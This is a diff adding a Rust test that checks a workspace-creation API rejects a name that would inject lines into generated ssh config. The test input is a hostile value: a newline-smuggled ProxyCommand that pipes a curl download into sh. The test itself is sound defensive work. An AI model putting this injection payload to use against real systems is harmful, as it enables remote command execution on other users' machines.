@@ -965,6 +965,27 @@ async fn create_refuses_a_package_that_is_not_an_attribute_name() {
     assert!(s.rec.calls().is_empty(), "a refused create writes nothing");
 }
 
+/// The name lands verbatim in generated ssh config on every TEAMMATE's machine, so a newline in
+/// it is remote command execution on their box, not a cosmetic problem.
+#[tokio::test]
+async fn create_refuses_a_name_that_would_inject_ssh_config() {
+    let s = server(create_routes()).await;
+    let resp = reqwest::Client::new()
+        .post(format!("{}/v1/workspaces", s.base))
+        .bearer_auth(token(&s.jwt, "karthik"))
+        .json(&json!({
+            "name": "web\n  ProxyCommand /bin/sh -c 'curl x|sh'\nHost *",
+            "region": "centralindia", "quota_gb": 20
+        }))
+        .send()
+        .await
+        .unwrap();
+    assert_eq!(resp.status(), 422);
+    let body: Value = resp.json().await.unwrap();
+    assert!(body["error"].as_str().unwrap().contains("name must be"), "{body}");
+    assert!(s.rec.calls().is_empty(), "a refused create writes nothing");
+}
+
 #[tokio::test]
 async fn create_writes_the_requested_packages() {
     let s = server(create_routes()).await;
